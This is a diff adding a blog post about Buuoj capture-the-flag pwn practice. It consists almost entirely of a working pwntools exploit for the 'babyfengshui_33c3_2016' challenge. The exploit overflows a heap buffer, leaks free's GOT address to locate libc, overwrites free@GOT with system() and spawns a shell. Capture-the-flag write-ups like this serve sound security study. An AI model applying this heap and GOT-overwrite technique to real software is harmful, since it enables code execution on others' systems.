@@ -1,0 +1,111 @@
+---
+toc: true
+classes: wide
+layout: single
+title:  "Buuoj PWN 题目冲分过程2（指俯冲）"
+date:   2020-11-16 22:15:38 +0800
+categories: 
+  - pwn
+---
+
+# Buuoj PWN 题目冲分过程2（指俯冲）
+
+
+## Problems
+
+### glibc heap related
+
+#### babyfengshui_33c3_2016
+
+```python
+
+#!/usr/bin/python3.6
+from pwn import *
+from LibcSearcher import LibcSearcher
+
+filename = './babyfengshui_33c3_2016'
+e = ELF(filename)
+p = process(filename)
+# p = remote("node3.buuoj.cn", 29672)
+
+def Add(name, text, text_buf_len=None, text_len=None):
+    """
+    struct st { char* desc; char name[0x7c]; };
+    输入 description 长度，malloc指定长度得ptr_desc，然后memset置零
+    再malloc(0x80),同样置零得ptr_st，这个应该是一个结构体，ptr_st.ptr_desc = ptr_desc
+    结构体指针数组 arr_st[index] = ptr_st
+    然后f1 get_name(arr_st[index].name, 0x7c) -> fgets(v0, v1, STDIN), strchr(v0, 0x0a)[0]=0
+    index+=1
+    f2 get_text(index-1) -> if check arr_st[a0].desc+len < (arr_st[a0] - 4) <---- &(chunk.size), then get_name(arr_st[a0].desc, len+1) 
+    """
+    p.sendlineafter(b'Action: ', b'0')
+    p.sendlineafter(b'size of description: ', bytes(f'{text_buf_len or len(text)}', encoding='utf8'))
+    p.sendlineafter(b'name: ', name)
+    p.sendlineafter(b'text length: ', bytes(f'{text_len or len(text)}', encoding='utf8'))
+    p.sendlineafter(b'text: ', text)
+
+
+def Delete(index):
+    """
+    free(arr_st[a0].desc)
+    free(arr_st[a0])
+    arr_st[0] = NULL
+    """
+    p.sendlineafter(b'Action: ', b'1')
+    p.sendlineafter(b'index: ', bytes(f'{index}', encoding='utf8'))
+
+
+def Display(index):
+    """
+    printf("%s", arr_st[a0].name)
+    printf("%s", arr_st[a0].desc)
+    """
+    p.sendlineafter(b'Action: ', b'2')
+    p.sendlineafter(b'index: ', bytes(f'{index}', encoding='utf8'))
+
+
+def Update(index, text, text_len=None):
+    """"""
+    p.sendlineafter(b'Action: ', b'3')
+    p.sendlineafter(b'index: ', bytes(f'{index}', encoding='utf8'))
+    p.sendlineafter(b'text length: ', bytes(f'{text_len or len(text)}', encoding='utf8'))
+    p.sendlineafter(b'text: ', text)
+
+
+def Exit():
+    p.sendlineafter(b'Action: ', b'4')
+
+
+Add(b'name0', b'desc0', text_buf_len=0x10-8)  # index=0, 0x10 0x88, x
+Add(b'name1', b'desc1', text_buf_len=0x10-8)  # index=1, 0x10 0x88
+Add(b'name2', b'desc2', text_buf_len=0x10-8)  # index=2, 0x10 0x88, x
+Add(b'/bin/sh', b'/bin/sh')  # index=3, 0x10 0x88, 
+
+c_func_name = 'free'
+c_func_got = e.got[c_func_name]
+
+Delete(0)
+Delete(2)
+payload_leak_got = b'x' * (0x88 - 8) + \
+    b'xxxx' + p32(0x10|0x1) + b'x'*8 + \
+    b'yyyy' + p32(0x88|0x1) + p32(c_func_got) + b'\x00'
+
+Add(b'name4', payload_leak_got, text_buf_len=0x80-0x8)  # index=4
+Display(1)
+p.recvuntil(b'description: ')
+c_func_addr = u32(p.recv(4))
+log.success(f'c: {c_func_name}() address={hex(c_func_addr)}')
+
+searcher = LibcSearcher(func=c_func_name, address=c_func_addr)
+c_base_addr = c_func_addr - searcher.dump(c_func_name)
+system_addr = c_base_addr + searcher.dump('system')
+
+log.success(f'c base address={hex(c_base_addr)}; system()={hex(system_addr)}')
+
+Update(1, p32(system_addr) + b'zzzz')
+
+Delete(3)
+p.interactive()
+
+
+```
